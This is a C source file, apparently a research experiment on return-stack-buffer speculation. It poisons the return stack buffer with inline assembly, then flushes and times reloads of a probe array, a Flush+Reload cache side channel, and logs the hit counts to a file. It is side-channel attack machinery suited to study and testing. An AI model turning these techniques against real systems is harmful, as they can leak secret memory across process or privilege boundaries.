#define _GNU_SOURCE 
#include<stdio.h>
#include<string.h>    //strlen
#include <sched.h>
#include <inttypes.h>
#include<linux/futex.h>
#include<linux/unistd.h>
#include<errno.h>
#include<sys/syscall.h>
#include "syscallsmac.h"
#include<stdlib.h>    //strlen
#include<sys/socket.h>
//#include "rtm.h"
#include<arpa/inet.h> //inet_addr
#include<unistd.h>    //write
#include<pthread.h> //for threading , link with lpthread
#include <fcntl.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif

uint8_t array2[260 * 512];
extern void rsb_pollute();
extern void push_return();
int main(int argc , char *argv[]){


  int tries, i, j, k, m, mix_i, junk = 0;
  static int results[256];
  register size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
   int cache_hit_threshold = 80;

	asm volatile(".rept 140;nop;.endr");

    for (m =0; m < 256; m++)
	results[m] = 0;

    for (i =0;i<sizeof(array2);i++){

	array2[i] = 1;}

    for (tries = 999; tries > 0; tries--) {



	rsb_pollute();	//push ret address on the RSB
	asm volatile("lea array2,%rax;"
	"add $0x1400, %rax;" //array2 [10 * 512]
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x1600, %rax;"//array2 [11 * 512]
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x1800, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x1a00, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x1c00, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x1e00, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x2000, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x2200, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x2400, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x2600, %rax;"
	"mov (%rax), %rbx;"
		"retq;");
	asm volatile(".rept 4;nop;.endr");

	rsb_pollute();	
	asm volatile("lea array2,%rax;"
	"add $0x2800, %rax;"
	"mov (%rax), %rbx;"//[20 * 512]
		"retq;");
	asm volatile(".rept 4;nop;.endr");



  	for (i = 0; i < 256; i++){               //flush array2
  	    _mm_clflush( & array2[i * 512]);
	}



	asm volatile ("jmp push_return;");//jump to push return func
	asm volatile(".rept 4;nop;.endr");


  for (i = 0; i < 256; i++) {

	 mix_i = ((i * 167) + 13) & 255;
    	addr = & array2[mix_i * 512];

//	_mm_mfence();

    	 time1 = __rdtscp( & junk);
     	junk = * addr; 
     	 time2 = __rdtscp( & junk) - time1; 


	if (time2 < cache_hit_threshold){
		
		results[mix_i]++;
	}
}

}

	FILE *fp;
	fp = fopen ("1.txt","a");
for (i = 20 ; i >= 10; i--){
    
	
	fprintf(fp, "%d \t %d\n", 21 - i   , results[i]);

}
	fprintf(fp,"\n\n");

fclose(fp);

}
